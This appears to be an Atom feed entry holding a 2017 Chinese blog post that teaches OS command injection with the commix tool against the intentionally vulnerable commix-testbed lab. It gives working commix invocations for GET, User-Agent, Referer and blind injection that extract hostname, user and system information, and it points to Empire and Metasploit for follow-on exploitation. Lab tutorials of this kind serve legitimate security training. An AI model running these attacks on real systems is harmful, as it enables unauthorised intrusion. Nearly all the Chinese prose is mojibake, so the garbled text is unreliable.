    <link href="http://zer0yu.github.io/2017/01/21/commix-%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%E5%AE%9E%E4%BE%8B/"/>
    <id>http://zer0yu.github.io/2017/01/21/commix-ç³»ç»Ÿå‘½ä»¤æ³¨å…¥è‡ªåŠ¨åŒ–æµ‹è¯•å®ä¾‹/</id>
    <published>2017-01-21T13:14:09.000Z</published>
    <updated>2017-01-21T13:31:04.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="å¼•è¨€"><a href="#å¼•è¨€" class="headerlink" title="å¼•è¨€"></a>å¼•è¨€</h4><p>â€‹    commixæ˜¯ä¸€æ¬¾å¾ˆå¥½ç”¨çš„å‘½ä»¤æ³¨å…¥çš„å·¥å…·ï¼Œå‰å‡ å¤©çœ‹äº†çœ‹å›½å†…å¯¹å…¶çš„ä»‹ç»å’Œä½¿ç”¨ç¤ºä¾‹æŒºå°‘çš„ï¼Œæ‰€ä»¥æœ€è¿‘æœ‰ç©ºå°±å†™äº†è¿™ä¸€ç¯‡æ–‡ç« æ¥åˆ—ä¸¾å‡ ä¸ªä½¿ç”¨çš„æ —å­ã€‚</p><h4 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h4><p>â€‹    å‘½ä»¤æ³¨å…¥å°±æ˜¯éƒ¨åˆ†Webåº”ç”¨ç¨‹åºæä¾›äº†ä¸€äº›å‘½ä»¤æ‰§è¡Œçš„æ“ä½œï¼Œé‚£ä¹ˆåœ¨Webåº”ç”¨ç¨‹åºåº•å±‚å»è°ƒç”¨ç³»ç»Ÿæ“ä½œå‘½ä»¤æ—¶ï¼Œå¦‚æœæ²¡æœ‰è¿‡æ»¤å¥½ç”¨æˆ·è¾“å…¥çš„æ•°æ®ï¼Œå°±å¾ˆæœ‰å¯èƒ½å½¢æˆç³»ç»Ÿå‘½ä»¤æ‰§è¡Œæ¼æ´æ¥ç›´æ¥æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤ã€‚è¯¦ç»†è®²è§£å‚è€ƒ<a href="https://www.owasp.org/index.php/Command_Injection" target="_blank" rel="noopener">Command Injection</a></p><h4 id="commixç®€ä»‹"><a href="#commixç®€ä»‹" class="headerlink" title="commixç®€ä»‹"></a>commixç®€ä»‹</h4><p>â€‹    æ­¤å¤„å°±ä¸è¯¦ç»†ä»‹ç»äº†å¦‚æœæƒ³è¦äº†è§£å¯ä»¥çœ‹è¿™ä¸¤ç¯‡æ–‡ç« ï¼š</p><p>â€‹    <a href="http://www.mottoin.com/91981.html" target="_blank" rel="noopener">http://www.mottoin.com/91981.html</a></p><p>â€‹    <a href="http://www.mottoin.com/91806.html" target="_blank" rel="noopener">http://www.mottoin.com/91806.html</a></p><h4 id="æµ‹è¯•ç¯å¢ƒæ­å»º"><a href="#æµ‹è¯•ç¯å¢ƒæ­å»º" class="headerlink" title="æµ‹è¯•ç¯å¢ƒæ­å»º"></a>æµ‹è¯•ç¯å¢ƒæ­å»º</h4><p>â€‹    åœ¨è¿™é‡Œä½ å¯ä»¥ä½¿ç”¨DVWAæˆ–è€…DWAPPæ¥å®æˆ˜ï¼Œå½“ç„¶æˆ‘è§‰å¾—è¦å°½å¯èƒ½å…¨çš„åŒ…å«å„ç§ç±»å‹çš„å‘½ä»¤æ³¨å…¥æ¼æ´æ‰ç®—å®Œç¾æ‰€ä»¥æˆ‘ä»¬åœ¨æ­¤å¤„ä½¿ç”¨commixæä¾›çš„ä¸€ä¸ªæµ‹è¯•å¹³å°<a href="https://github.com/commixproject/commix-testbed" target="_blank" rel="noopener">commix-testbed</a>ã€‚</p><p>1.å¦‚æœä½ åœ¨ä½¿ç”¨windowså¹³å°é‚£ä¹ˆæˆ‘æ¨è<a href="http://www.phpstudy.net/" target="_blank" rel="noopener">PHPStudy</a>æ¥æ­å»ºç¯å¢ƒ</p><p>å®‰è£…å®Œæˆåä½ åªéœ€è¦åœ¨phpstudyçš„wwwç›®å½•ä¸‹æ‰“å¼€cmdé”®å…¥ï¼š</p><p><code>git clone https://github.com/commixproject/commix-testbed.git</code></p><p>(å½“ç„¶ä½ è¦ç¡®ä¿ä½ å®‰è£…äº†Git)</p><p>ä¹‹ååªè¦å¯åŠ¨phpstudyå°±å¯ä»¥åœ¨æµè§ˆå™¨ä¸­è®¿é—®äº†</p><p>2.å¦‚æœä½ ä½¿ç”¨çš„æ˜¯Linuxæˆ–è€…MacOSå¹³å°æˆ‘æ¨èç”¨xamppæ¥æ­å»ºç¯å¢ƒ</p><p>æ­å»ºå¥½ä¹‹åä½ å°±å¯ä»¥çœ‹åˆ°å¦‚ä¸‹ç•Œé¢</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/commix-1.png" alt="1"></p><p>ç¯å¢ƒæ­å»ºå¥½åæˆ‘ä»¬æ¥è¿›è¡Œæ¸—é€æµ‹è¯•</p><h4 id="ç¤ºä¾‹ä¸€ï¼šResults-basedå‘½ä»¤æ³¨å…¥æ”»å‡»"><a href="#ç¤ºä¾‹ä¸€ï¼šResults-basedå‘½ä»¤æ³¨å…¥æ”»å‡»" class="headerlink" title="ç¤ºä¾‹ä¸€ï¼šResults-basedå‘½ä»¤æ³¨å…¥æ”»å‡»"></a>ç¤ºä¾‹ä¸€ï¼šResults-basedå‘½ä»¤æ³¨å…¥æ”»å‡»</h4><p>æˆ‘ä»¬é€‰æ‹©GETæ–¹å¼çš„Classic regular example</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/commix-2.png" alt="2"></p><p>pingä¸‹127.0.0.1è¯•ä¸‹</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/commix-3.png" alt="3"></p><p>å¤åˆ¶urlå¹¶æ‰“å¼€commixå¼€å§‹hack</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/commix-4.png" alt="4"></p><p>æ¸—é€ä¸»æœºä¸ºwinåæœŸå¯ä»¥å€ŸåŠ©empireï¼ˆä¸çŸ¥é“empireï¼Ÿï¼Ÿï¼Ÿæ²¡å…³ç³»<a href="http://www.mottoin.com/?s=empire" target="_blank" rel="noopener">æˆ³æˆ‘</a>ï¼‰</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/commix-5.png" alt="5"></p><p>å¯ä»¥ä½¿ç”¨</p><p><code>commix -u &quot;http://192.168.1.108/commix-testbed/scenarios/regular/GET/classic.php?addr=127.0.0.1&quot; --hostname --current-user --sys-info</code></p><p>å«ä¹‰ï¼šæ˜¾ç¤ºå½“å‰æµ‹è¯•ä¸»æœºçš„ä¸»æœºåï¼Œç”¨æˆ·åå’Œç³»ç»Ÿä¿¡æ¯</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/commix-8.png" alt="8"></p><p>å¦‚æœæ¸—é€ä¸»æœºä¸ºLinuxåˆ™åæœŸå¯ä»¥å€ŸåŠ©msf(ä¸ä¼šmsfï¼Ÿï¼Ÿï¼Ÿæ²¡å…³ç³»<a href="http://www.mottoin.com/18517.html" target="_blank" rel="noopener">æˆ³æˆ‘</a>)</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/commix-9.png" alt="9"></p><h4 id="ç¤ºä¾‹äºŒï¼šUser-Agent-HTTPå¤´æ³¨å…¥æ”»å‡»"><a href="#ç¤ºä¾‹äºŒï¼šUser-Agent-HTTPå¤´æ³¨å…¥æ”»å‡»" class="headerlink" title="ç¤ºä¾‹äºŒï¼šUser-Agent HTTPå¤´æ³¨å…¥æ”»å‡»"></a>ç¤ºä¾‹äºŒï¼šUser-Agent HTTPå¤´æ³¨å…¥æ”»å‡»</h4><p>é€‰æ‹©User-Agent HTTP Headerä¸­çš„ç¬¬ä¸€ä¸ªClassic user-agent-based example</p><p><code>http://192.168.1.108/commix-testbed/scenarios/user-agent/ua(classic).php</code></p><p>ç„¶åå¼€å§‹ä½¿ç”¨commixæ³¨å…¥ï¼š</p><p><code>commix -u &quot;http://192.168.1.108/commix-testbed/scenarios/user-agent/ua(classic).php&quot; --data=&quot;addr=192.168.1.121&quot; --technique=&quot;c&quot;</code></p><p>å«ä¹‰ï¼špostå‚æ•°addr=192.168.1.121å¹¶æŒ‡å®šè¦ä½¿ç”¨çš„è¿›æ ·æŠ€æœ¯</p><p>æ•ˆæœå¦‚ä¸‹ï¼š</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/commix-10.png" alt="10"></p><h4 id="ç¤ºä¾‹ä¸‰ï¼šReferer-HTTPå¤´æ³¨å…¥æ”»å‡»"><a href="#ç¤ºä¾‹ä¸‰ï¼šReferer-HTTPå¤´æ³¨å…¥æ”»å‡»" class="headerlink" title="ç¤ºä¾‹ä¸‰ï¼šReferer HTTPå¤´æ³¨å…¥æ”»å‡»"></a>ç¤ºä¾‹ä¸‰ï¼šReferer HTTPå¤´æ³¨å…¥æ”»å‡»</h4><p>é€‰æ‹©Referer HTTP Headerä¸­çš„ç¬¬ä¸€ä¸ªClassic referer-based example</p><p><code>http://192.168.1.108/commix-testbed/scenarios/referer/referer(classic).php</code></p><p>ç„¶åå¼€å§‹ä½¿ç”¨commixæ³¨å…¥ï¼š</p><p><code>commix -u &quot;http://192.168.1.108/commix-testbed/scenarios/referer/referer(classic).php&quot; --data=&quot;addr=192.168.1.121&quot; --technique=&quot;c&quot;</code></p><p>å’Œä¸Šé¢çš„å·®ä¸å¤šä¸è§£é‡Šäº†</p><p>æ•ˆæœå¦‚ä¸‹ï¼š</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/commix-11.png" alt="11"></p><h4 id="ç¤ºä¾‹å››ï¼šBlind-å‘½ä»¤æ³¨å…¥æ”»å‡»"><a href="#ç¤ºä¾‹å››ï¼šBlind-å‘½ä»¤æ³¨å…¥æ”»å‡»" class="headerlink" title="ç¤ºä¾‹å››ï¼šBlind å‘½ä»¤æ³¨å…¥æ”»å‡»"></a>ç¤ºä¾‹å››ï¼šBlind å‘½ä»¤æ³¨å…¥æ”»å‡»</h4><p>é€‰æ‹©Regular (GET / POST)ä¸­çš„Blind regular example</p><p><code>http://192.168.1.108/commix-testbed/scenarios/regular/GET/blind.php?addr=127.0.0.1</code></p><p>ç„¶åå¼€å§‹ä½¿ç”¨commixæ³¨å…¥ï¼š</p><p><code>commix -u &quot;http://192.168.1.108/commix-testbed/scenarios/regular/GET/blind.php?addr=127.0.0.1&quot; --technique=&quot;tf&quot; -v 1</code></p><p>æ•ˆæœå¦‚ä¸‹ï¼š</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/commix-12.png" alt="12"></p><p>æ‰§è¡Œå‘½ä»¤ï¼š</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/commix-13.png" alt="13"></p><h4 id="å½©è›‹"><a href="#å½©è›‹" class="headerlink" title="å½©è›‹"></a>å½©è›‹</h4><p>ä¸Šé¢çš„ä¾‹å­ä¸æ˜¯å¾ˆå…¨ï¼Œæœ‰å‡ ä¸ªä½¿ç”¨commixè¿›è¡Œå‘½ä»¤æ³¨å…¥çš„è§†é¢‘ï¼Œæœ‰å…´è¶£å¯ä»¥ä¸‹è½½çœ‹ä¸‹</p><p>é“¾æ¥: <a href="https://pan.baidu.com/s/1qXMNjZm" target="_blank" rel="noopener">https://pan.baidu.com/s/1qXMNjZm</a> å¯†ç : 5peb</p><h4 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h4><p><a href="https://github.com/commixproject/commix-testbed" target="_blank" rel="noopener">https://github.com/commixproject/commix-testbed</a></p><p><a href="https://github.com/commixproject/commix" target="_blank" rel="noopener">https://github.com/commixproject/commix</a></p><p><a href="http://www.commixproject.com/" target="_blank" rel="noopener">http://www.commixproject.com/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;å¼•è¨€&quot;&gt;&lt;a href=&quot;#å¼•è¨€&quot; class=&quot;headerlink&quot; title=&quot;å¼•è¨€&quot;&gt;&lt;/a&gt;å¼•è¨€&lt;/h4&gt;&lt;p&gt;â€‹    commixæ˜¯ä¸€æ¬¾å¾ˆå¥½ç”¨çš„å‘½ä»¤æ³¨å…¥çš„å·¥å…·ï¼Œå‰å‡ å¤©çœ‹äº†çœ‹å›½å†…å¯¹å…¶çš„ä»‹ç»å’Œä½¿ç”¨ç¤ºä¾‹æŒºå°‘çš„ï¼Œæ‰€ä»¥æœ€è¿‘æœ‰ç©ºå°±å†™äº†è¿™ä¸€ç¯‡æ–‡ç« æ¥åˆ—ä¸¾å‡ ä¸ªä½¿ç”¨çš„
      
    
    </summary>
    
    
  </entry>
  
</feed>
